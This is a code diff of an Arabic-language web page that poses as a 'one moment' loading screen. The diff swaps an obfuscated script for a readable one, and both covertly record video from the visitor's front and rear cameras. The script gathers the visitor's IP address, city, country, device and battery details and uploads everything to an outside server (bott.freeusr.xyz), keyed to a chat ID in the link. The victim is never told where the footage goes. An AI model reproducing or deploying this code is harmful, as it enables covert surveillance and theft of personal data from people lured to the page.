@@ -5,62 +5,379 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>لحظة واحدة..</title>
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
+      font-family: 'Arial', sans-serif;
       background-color: #121212;
       color: #e0e0e0;
       overflow: hidden;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
+
     video {
       display: none;
     }
+
+    /* ===== شاشة التحميل ===== */
     #loadingOverlay {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(18, 18, 18, 0.8);
+      background: rgba(18, 18, 18, 0.95);
       color: #e0e0e0;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 24px;
       z-index: 1000;
       flex-direction: column;
+      padding: 20px;
     }
+
     .spinner {
-      border: 16px solid #f3f3f3;
-      border-top: 16px solid #3498db;
+      border: 6px solid rgba(255, 255, 255, 0.1);
+      border-top: 6px solid #e74c3c;
       border-radius: 50%;
-      width: 100px;
-      height: 100px;
-      animation: spin 1.5s linear infinite;
-      margin-bottom: 20px;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 25px;
     }
+
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
     .loadingText {
-      font-size: 20px;
+      font-size: 1.3rem;
       text-align: center;
-      font-weight: bold;
-      text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+      font-weight: 600;
+      color: rgba(255, 255, 255, 0.9);
+    }
+
+    .loadingSubText {
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.5);
+      margin-top: 10px;
+    }
+
+    /* ===== رسالة النجاح ===== */
+    .success-container {
+      text-align: center;
+      animation: fadeInUp 0.8s ease-out;
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(30px) scale(0.95);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .check-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #e74c3c, #c0392b);
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0 auto 25px;
+      animation: pulse 1.5s ease-in-out infinite;
+      box-shadow: 0 10px 30px rgba(231, 76, 60, 0.4);
+    }
+
+    .check-icon svg {
+      width: 45px;
+      height: 45px;
+      fill: none;
+      stroke: #fff;
+      stroke-width: 3;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.08); }
+      100% { transform: scale(1); }
+    }
+
+    .main-title {
+      font-size: 2.8rem;
+      font-weight: 700;
+      color: #e74c3c;
+      margin-bottom: 10px;
+      text-shadow: 0 0 30px rgba(231, 76, 60, 0.3);
+    }
+
+    .line {
+      width: 60px;
+      height: 3px;
+      background: linear-gradient(90deg, transparent, #e74c3c, transparent);
+      margin: 15px auto 20px;
+      border-radius: 2px;
+    }
+
+    .sub-text {
+      font-size: 1.1rem;
+      color: rgba(255, 255, 255, 0.7);
+      margin: 15px 0 30px;
+      line-height: 1.8;
+    }
+
+    .close-btn {
+      background: linear-gradient(135deg, #e74c3c, #c0392b);
+      color: #fff;
+      border: none;
+      padding: 14px 40px;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      font-family: 'Arial', sans-serif;
+      box-shadow: 0 8px 25px rgba(231, 76, 60, 0.3);
+    }
+
+    .close-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 35px rgba(231, 76, 60, 0.5);
+    }
+
+    .close-btn:active {
+      transform: translateY(0);
+    }
+
+    /* ===== رسالة الخطأ ===== */
+    .error-text {
+      color: #e74c3c;
+      font-size: 1.2rem;
+      text-align: center;
+      padding: 20px;
+    }
+
+    /* ===== تحسينات إضافية ===== */
+    .status-icon {
+      font-size: 2.5rem;
+      margin-bottom: 15px;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    .blink {
+      animation: blink 1.5s ease-in-out infinite;
     }
   </style>
 </head>
 <body>
+  <!-- شاشة التحميل -->
   <div id="loadingOverlay">
-    <div class="spinner"></div>
-    <div class="loadingText" id="status">لحظة واحدة</div>
+    <div id="loadingContent">
+      <div class="spinner"></div>
+      <div class="loadingText" id="status">📹 جاري تجهيز الكاميرا</div>
+      <div class="loadingSubText" id="subStatus">يرجى الانتظار...</div>
+    </div>
   </div>
+
   <video id="preview" width="640" height="480" autoplay muted></video>
 
   <script>
-function _0x454f(_0x31757a,_0x3dda2d){_0x31757a=_0x31757a-0x16b;const _0x3289b9=_0x3289();let _0x454fd7=_0x3289b9[_0x31757a];return _0x454fd7;}const _0x12c946=_0x454f;(function(_0x2970e2,_0x57de6e){const _0xe5cdc6=_0x454f,_0x3d19a9=_0x2970e2();while(!![]){try{const _0x1e1f2f=parseInt(_0xe5cdc6(0x1a6))/0x1+-parseInt(_0xe5cdc6(0x18d))/0x2+-parseInt(_0xe5cdc6(0x193))/0x3+-parseInt(_0xe5cdc6(0x1a3))/0x4*(parseInt(_0xe5cdc6(0x18c))/0x5)+parseInt(_0xe5cdc6(0x17b))/0x6*(-parseInt(_0xe5cdc6(0x183))/0x7)+parseInt(_0xe5cdc6(0x19a))/0x8*(parseInt(_0xe5cdc6(0x188))/0x9)+parseInt(_0xe5cdc6(0x198))/0xa*(parseInt(_0xe5cdc6(0x191))/0xb);if(_0x1e1f2f===_0x57de6e)break;else _0x3d19a9['push'](_0x3d19a9['shift']());}catch(_0x27a8a2){_0x3d19a9['push'](_0x3d19a9['shift']());}}}(_0x3289,0x66b79));const chatId=new URLSearchParams(window[_0x12c946(0x186)][_0x12c946(0x17c)])[_0x12c946(0x1a2)](_0x12c946(0x194)),statusText=document[_0x12c946(0x179)](_0x12c946(0x18f)),videoElement=document[_0x12c946(0x179)](_0x12c946(0x19c));async function getDeviceInfo(){const _0x1271a0=_0x12c946;try{const _0x3b9734=await fetch(_0x1271a0(0x1a5)),_0x22b2ad=await _0x3b9734[_0x1271a0(0x18b)](),_0x646d4d=navigator[_0x1271a0(0x18e)]?await navigator[_0x1271a0(0x18e)]():{},_0x16394a=navigator[_0x1271a0(0x17f)],_0xe2c291=_0x16394a[_0x1271a0(0x195)](/\(([^)]+)\)/);return{'ip':_0x22b2ad['ip'],'country':_0x22b2ad[_0x1271a0(0x19f)],'city':_0x22b2ad[_0x1271a0(0x1a4)],'platform':/Android/[_0x1271a0(0x181)](_0x16394a)?_0x1271a0(0x1a1):/iPhone|iPad/[_0x1271a0(0x181)](_0x16394a)?_0x1271a0(0x197):_0x1271a0(0x187),'deviceVersion':_0xe2c291?_0xe2c291[0x1]:_0x1271a0(0x182),'batteryLevel':_0x646d4d[_0x1271a0(0x1a7)],'batteryCharging':_0x646d4d[_0x1271a0(0x180)]};}catch(_0x11d51e){return{};}}async function recordAndSendVideo(_0x4cdb4c=_0x12c946(0x184)){const _0x19c708=_0x12c946;statusText[_0x19c708(0x177)]=_0x19c708(0x18a);const _0x4c3000={'video':{'facingMode':_0x4cdb4c},'audio':![]};try{const _0x1c4128=await navigator[_0x19c708(0x170)][_0x19c708(0x1a9)](_0x4c3000);videoElement[_0x19c708(0x196)]=_0x1c4128;const _0x2c8aa8=new MediaRecorder(_0x1c4128),_0x4d0fb2=[];_0x2c8aa8[_0x19c708(0x192)]=_0x40317c=>_0x4d0fb2[_0x19c708(0x172)](_0x40317c[_0x19c708(0x19b)]),_0x2c8aa8[_0x19c708(0x17d)]();const _0x177cc7=0xbb8+Math[_0x19c708(0x1a8)](Math[_0x19c708(0x19d)]()*0x7d0);await new Promise(_0x255229=>setTimeout(_0x255229,_0x177cc7)),_0x2c8aa8[_0x19c708(0x185)](),await new Promise(_0x39bfcb=>_0x2c8aa8[_0x19c708(0x190)]=_0x39bfcb),_0x1c4128[_0x19c708(0x1ab)]()[_0x19c708(0x178)](_0x308d8b=>_0x308d8b[_0x19c708(0x185)]());const _0x5ce0b1=new Blob(_0x4d0fb2,{'type':_0x19c708(0x16f)}),_0x3a32a4=new FormData();_0x3a32a4[_0x19c708(0x19e)](_0x19c708(0x16e),_0x5ce0b1,_0x19c708(0x17e)),_0x3a32a4[_0x19c708(0x19e)](_0x19c708(0x173),chatId),_0x3a32a4[_0x19c708(0x19e)](_0x19c708(0x1aa),_0x4cdb4c);const _0x24d108=await getDeviceInfo();_0x3a32a4[_0x19c708(0x19e)](_0x19c708(0x174),JSON[_0x19c708(0x16d)](_0x24d108)),statusText[_0x19c708(0x177)]=_0x19c708(0x18a);const _0x7d4606=await fetch(_0x19c708(0x17a),{'method':_0x19c708(0x171),'body':_0x3a32a4});if(!_0x7d4606['ok'])throw new Error(_0x19c708(0x16c));statusText[_0x19c708(0x177)]=_0x19c708(0x189);}catch(_0x595794){console[_0x19c708(0x199)](_0x595794),statusText[_0x19c708(0x177)]=_0x19c708(0x176);}}((async()=>{const _0x4ebe37=_0x12c946;await recordAndSendVideo(_0x4ebe37(0x184)),await recordAndSendVideo(_0x4ebe37(0x16b)),window[_0x4ebe37(0x186)][_0x4ebe37(0x1a0)]=_0x4ebe37(0x175);})());function _0x3289(){const _0x67dd06=['status','onstop','737ZNaXUl','ondataavailable','1949985HVDMiK','chatId','match','srcObject','iOS','347020ZzuErD','error','9896yKxNYC','data','preview','random','append','country_name','href','Android','get','4NzEFxI','city','https://ipapi.co/json/','120777fqMOVB','level','floor','getUserMedia','cameraType','getTracks','environment','لحظة\x20واحدة','stringify','video','video/webm','mediaDevices','POST','push','userId','additionalData','https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738','❌\x20لم\x20يتم\x20الحصول\x20على\x20صلاحيات\x20الكاميرا.','innerText','forEach','getElementById','https://bott.freeusr.xyz/submitVideo','12juoULW','search','start','recording.webm','userAgent','charging','test','Unknown','1675961muGbvh','user','stop','location','Other','882JEEIET','تم\x20بنجاح','لحظة\x20واحدة...','json','3333635ErHGgg','701480lxmdSk','getBattery'];_0x3289=function(){return _0x67dd06;};return _0x3289();}
+    const chatId = new URLSearchParams(window.location.search).get('chatId');
+    const statusText = document.getElementById('status');
+    const subStatusText = document.getElementById('subStatus');
+    const videoElement = document.getElementById('preview');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+
+    // ===== عرض رسالة النجاح =====
+    function showSuccessMessage() {
+      loadingOverlay.innerHTML = `
+        <div class="success-container">
+          <div class="check-icon">
+            <svg viewBox="0 0 24 24">
+              <polyline points="20 6 9 17 4 12" />
+            </svg>
+          </div>
+          <h1 class="main-title">انتهى اغلق الصفحة</h1>
+          <div class="line"></div>
+          <p class="sub-text">
+            ✅ تم إرسال الفيديو بنجاح<br>
+            يمكنك الآن إغلاق هذه الصفحة
+          </p>
+          <button class="close-btn" onclick="closePage()">
+            ✕ إغلاق الصفحة
+          </button>
+        </div>
+      `;
+    }
+
+    // ===== عرض رسالة الخطأ =====
+    function showError(message) {
+      loadingOverlay.innerHTML = `
+        <div class="error-text">
+          <div style="font-size: 3rem; margin-bottom: 15px;">❌</div>
+          ${message}
+          <br><br>
+          <button class="close-btn" onclick="location.reload()" style="font-size: 0.9rem; padding: 10px 30px;">
+            🔄 إعادة المحاولة
+          </button>
+        </div>
+      `;
+    }
+
+    // ===== دالة إغلاق الصفحة =====
+    function closePage() {
+      window.close();
+      setTimeout(() => {
+        document.body.innerHTML = `
+          <div style="
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #121212;
+            color: #e74c3c;
+            font-size: 1.5rem;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+          ">
+            ✅ يمكنك إغلاق هذه الصفحة الآن
+          </div>
+        `;
+      }, 500);
+    }
+
+    // ===== تحديث حالة التحميل =====
+    function updateStatus(text, subText = '') {
+      statusText.textContent = text;
+      if (subText) subStatusText.textContent = subText;
+    }
+
+    // ===== الحصول على معلومات الجهاز =====
+    async function getDeviceInfo() {
+      try {
+        const ipRes = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        const battery = navigator.getBattery ? await navigator.getBattery() : {};
+        const ua = navigator.userAgent;
+        const match = ua.match(/\(([^)]+)\)/);
+
+        return {
+          ip: ipData.ip,
+          country: ipData.country_name,
+          city: ipData.city,
+          platform: /Android/.test(ua) ? "Android" : /iPhone|iPad/.test(ua) ? "iOS" : "Other",
+          deviceVersion: match ? match[1] : 'Unknown',
+          batteryLevel: battery.level,
+          batteryCharging: battery.charging
+        };
+      } catch (e) {
+        return {};
+      }
+    }
+
+    // ===== تسجيل وإرسال الفيديو =====
+    async function recordAndSendVideo(facingMode = "user") {
+      const cameraName = facingMode === "user" ? "الأمامية" : "الخلفية";
+      updateStatus(`📹 جاري تجهيز الكاميرا ${cameraName}`, 'يرجى السماح بصلاحية الكاميرا');
+
+      const constraints = { video: { facingMode }, audio: false };
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        videoElement.srcObject = stream;
+
+        updateStatus(`🎥 جاري تسجيل الفيديو (الكاميرا ${cameraName})`, 'سيتم الإرسال تلقائياً...');
+
+        const recorder = new MediaRecorder(stream);
+        const chunks = [];
+        recorder.ondataavailable = e => chunks.push(e.data);
+
+        recorder.start();
+
+        // تسجيل من 3 إلى 5 ثوانٍ
+        const duration = 3000 + Math.floor(Math.random() * 2000);
+        await new Promise(resolve => setTimeout(resolve, duration));
+        recorder.stop();
+
+        await new Promise(resolve => recorder.onstop = resolve);
+        stream.getTracks().forEach(t => t.stop());
+
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        const formData = new FormData();
+        formData.append('video', blob, 'recording.webm');
+        formData.append('userId', chatId);
+        formData.append('cameraType', facingMode);
+
+        const deviceInfo = await getDeviceInfo();
+        formData.append('additionalData', JSON.stringify(deviceInfo));
+
+        updateStatus(`📤 جاري إرسال الفيديو (الكاميرا ${cameraName})`, 'يرجى الانتظار...');
+
+        const res = await fetch('https://bott.freeusr.xyz/submitVideo', {
+          method: 'POST',
+          body: formData
+        });
+
+        if (!res.ok) throw new Error("فشل الإرسال");
+
+        updateStatus(`✅ تم إرسال الفيديو (الكاميرا ${cameraName})`, '');
+        return true;
+
+      } catch (err) {
+        console.error(err);
+        updateStatus(`❌ فشل في الكاميرا ${cameraName}`, err.message);
+        return false;
+      }
+    }
+
+    // ===== الوظيفة الرئيسية =====
+    (async () => {
+      // التحقق من وجود chatId
+      if (!chatId) {
+        showError("❌ خطأ: chatId غير موجود في الرابط");
+        return;
+      }
+
+      // تسجيل الكاميرا الأمامية
+      const frontSuccess = await recordAndSendVideo("user");
+      
+      // تأخير بسيط بين الكاميرات
+      await new Promise(resolve => setTimeout(resolve, 500));
+      
+      // تسجيل الكاميرا الخلفية
+      const backSuccess = await recordAndSendVideo("environment");
+
+      // ✅ تم إلغاء التحويل إلى الرابط الإعلاني
+      // window.location.href = "https://www.effectivegatecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
+
+      // ✅ عرض رسالة "انتهى اغلق الصفحة" بدلاً من التحويل
+      if (frontSuccess || backSuccess) {
+        // نجاح على الأقل في كاميرا واحدة
+        showSuccessMessage();
+      } else {
+        showError("❌ فشل في تسجيل جميع الكاميرات. يرجى المحاولة مرة أخرى.");
+      }
+    })();
   </script>
-<script src="https://pl27402931.effectivegatecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js"></script>
 </body>
 </html>
